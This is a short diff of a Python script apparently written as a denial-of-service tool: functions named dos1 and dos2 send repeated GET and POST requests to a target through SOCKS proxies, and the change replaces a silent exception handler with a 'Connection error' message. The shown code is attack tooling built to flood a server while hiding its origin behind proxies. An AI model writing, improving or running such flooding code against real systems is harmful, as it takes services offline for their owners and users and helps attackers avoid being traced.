@@ -53,7 +53,7 @@ def dos1(target):
             requests.get(target, headers=header2, proxies=proxiessocks)
             requests.post(target, headers=header2, proxies=proxiessocks)
         except:
-            pass
+            print("Connection error")
 
 
 def dos2(target):
